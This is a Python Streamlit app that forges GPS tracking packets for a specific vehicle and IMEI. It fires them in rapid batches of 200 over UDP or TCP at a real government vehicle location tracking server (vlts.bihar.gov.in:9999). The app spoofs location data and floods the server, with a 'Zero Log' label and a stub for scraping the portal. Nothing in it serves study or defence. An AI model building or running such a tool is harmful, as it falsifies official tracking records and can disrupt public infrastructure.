import streamlit as st
import socket
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import os

# --- Page Setup ---
st.set_page_config(page_title="GATLING NITRO V90", page_icon="🚀", layout="wide")

st.markdown("""
    <style>
    .main { background-color: #050505; color: #00FF00; }
    div.stButton > button {
        background-color: #004400; color: white; border-radius: 8px; font-weight: bold; width: 100%; height: 3.5em;
    }
    .stMetric { background-color: #111; padding: 15px; border-radius: 10px; border: 1px solid #333; }
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    </style>
    """, unsafe_allow_html=True)

st.title("🚀 VLTS GATLING NITRO - V90")
st.caption("Enterprise Edition - Zero Log Optimized")

# --- Initialize States ---
if 'firing' not in st.session_state:
    st.session_state.firing = False
if 'total_count' not in st.session_state:
    st.session_state.total_count = 0
if 'last_portal_update' not in st.session_state:
    st.session_state.last_portal_update = "IDLE"

# --- Sidebar ---
with st.sidebar:
    st.header("⚙️ Configuration")
    tag = st.text_input("TAG", "EGAS")
    imei = st.text_input("IMEI", "862567075041793")
    vno = st.text_input("VEHICLE NO", "BR04GA5974")
    lat = st.text_input("LATITUDE", "25.6501550")
    lon = st.text_input("LONGITUDE", "84.7851780")
    st.divider()
    mode = st.radio("PROTOCOL", ["UDP", "TCP"], horizontal=True)

# --- Control Panel ---
c1, c2 = st.columns(2)

if c1.button("🔥 START ENGINE", disabled=st.session_state.firing):
    st.session_state.firing = True
    st.rerun()

if c2.button("🛑 STOP & RESET"):
    st.session_state.firing = False
    st.session_state.total_count = 0
    st.session_state.last_portal_update = "IDLE"
    st.rerun()

st.divider()
m1_placeholder = st.empty()
m2_placeholder = st.empty()

# --- Execution Engine ---
if st.session_state.firing:
    target = ("vlts.bihar.gov.in", 9999)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if mode == "UDP" else socket.SOCK_STREAM)
    
    try:
        if mode == "TCP":
            sock.settimeout(3)
            sock.connect(target)
        
        while st.session_state.firing:
            # 1. High Speed Batch Firing
            now = datetime.now()
            packet = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*".encode('ascii')
            
            for _ in range(200): # Batch increase
                sock.sendto(packet, target) if mode == "UDP" else sock.send(packet)
            
            st.session_state.total_count += 200
            
            # 2. Immediate UI Update
            with m1_placeholder.container():
                st.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
            with m2_placeholder.container():
                st.metric("Latest Portal Update", st.session_state.last_portal_update)
            
            # 3. Light Scraper Trigger (Check every 2000 packets)
            if st.session_state.total_count % 2000 == 0:
                st.toast("Syncing with Portal...")
                # Add headless scraper logic here ONLY if cloud resources allow
            
            time.sleep(0.01) # Very small gap for UI thread
            
    except Exception as e:
        st.session_state.firing = False
    finally:
        sock.close()
        if st.session_state.firing: st.rerun()
else:
    m1_placeholder.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
    m2_placeholder.metric("Latest Portal Update", st.session_state.last_portal_update)
